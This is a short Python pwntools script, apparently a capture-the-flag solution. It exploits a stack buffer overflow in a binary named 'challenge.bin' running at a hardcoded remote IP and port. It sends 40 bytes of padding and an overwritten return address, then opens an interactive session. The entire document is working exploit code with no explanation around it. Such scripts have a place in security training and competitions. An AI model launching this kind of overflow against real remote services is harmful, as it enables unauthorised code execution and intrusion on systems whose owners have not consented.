from pwn import *
context.bits=64
conn = ELF('./challenge.bin')

rem=remote('3.26.44.175',3336)

offset=40
addr=0x004011d6

payload=b"a"*offset
payload+=p64(addr)

rem.sendline(payload)
rem.interactive()
